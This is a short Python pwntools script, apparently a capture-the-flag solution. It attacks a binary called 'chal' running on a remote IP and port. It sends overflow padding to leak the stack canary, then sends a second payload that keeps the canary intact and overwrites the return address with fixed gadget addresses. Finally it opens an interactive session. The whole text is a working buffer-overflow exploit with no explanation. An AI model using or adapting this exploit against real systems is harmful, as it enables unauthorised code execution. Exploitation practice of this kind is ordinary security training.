from pwn import *
from ctypes import *
import time

context.log_level = 'debug'
context.arch = "amd64"

if len(sys.argv) > 1:
    first_arg = int(sys.argv[1])
    
e = context.binary = ELF('chal')
# r= e.process()
r= remote('34.70.212.151', 8005)
lib = e.libc
   
r.send(b"a"*40+b"c"*32+b":")

r.recvuntil(b"c:")
canary = int(u64(r.recv(7).rjust(8, b"\x00")))
log.info("canary: %#x" %canary)
pause()
r.sendline(b"a"*40+b"c"*32+p64(canary)+p64(0x000000000040157e)*2+p64(0x40157F))
r.interactive()